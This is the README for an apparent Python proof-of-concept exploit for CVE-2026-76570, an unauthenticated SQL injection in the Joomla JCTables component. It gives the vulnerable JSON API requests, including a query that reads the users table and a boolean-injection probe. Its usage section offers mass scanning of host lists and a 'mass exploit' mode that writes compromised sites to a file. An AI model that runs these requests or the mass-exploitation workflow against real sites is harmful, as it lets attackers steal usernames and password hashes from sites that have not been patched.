# CVE-2026-76570 — JCTables (com_jctables) unauthenticated SQL read/write

Python 3 PoC for **[CVE-2026-76570](https://www.cve.org/CVERecord?id=CVE-2026-76570)** — **Joomcode** **JCTables** — **unauthenticated SQL injection** on the front-end JSON CRUD API (`getdatarow`, `getrow`, …).

| | |
|---|---|
| **CVE.org** | https://www.cve.org/CVERecord?id=CVE-2026-76570 (**PUBLISHED** 2026-09-30) |
| **NVD** | https://nvd.nist.gov/vuln/detail/CVE-2026-76570 |
| **CNA** | Joomla! Project |
| **Component** | `com_jctables` |
| **Affected** | **1.0.0 – 1.20.0** (lab: ≤ 1.10.31.2 confirmed) |
| **Fix** | **≥ 1.21.1** (2026-08-05) |
| **CWE** | **CWE-89**, **CWE-862** |
| **CVSS 4.0** | **10.0 Critical** — `AT:N` (no special admin config) |
| **Analysis** | [VulnCheck — JCTables SQL R/W → RCE chain](https://www.vulncheck.com/blog/jctables-unauthenticated-sql-rw-to-rce) |

## Mechanism (short)

Front-end controller tasks have **no token / ACL**. Table and column names from the request are concatenated into SQL; `ladb_escape()` treats quote-wrapped values as “already escaped”. **`getdatarow`** can read arbitrary DB tables (e.g. `{prefix}users`). This PoC **proves read** (username / bcrypt row) — it does **not** run the full admin-login / plugin RCE chain.

Success marker: **`POCBIT-76570-OK`** (in JSON proof metadata).

## Requirements

- Python **3.9+**
- `pip install requests urllib3 colorama`

## Usage

```bash
cd CVE-2026-76570
python poc.py                         # interactive
python poc.py hits.txt                # mass exploit → exploited.txt
python poc.py --check fofa_hosts.txt  # mass scan → hits.txt
python poc.py -u https://site.tld
python poc.py -u URL --prefix jos_    # if you know DB prefix
python poc.py --lab
python poc.py --help
python _engine.py --help
```

## API surface

| Step | Request |
|------|---------|
| Read row | `GET index.php?option=com_jctables&format=json&task=getdatarow&tn={prefix}users&idx=id&rid=1` |
| Boolean probe | `GET …&task=getrow&mid=N&tid=T&idx='' OR (1=1) OR ''` |

## Remediation

Upgrade **JCTables** to **1.21.1+** or remove the component.

## Legal

Authorized security testing only.
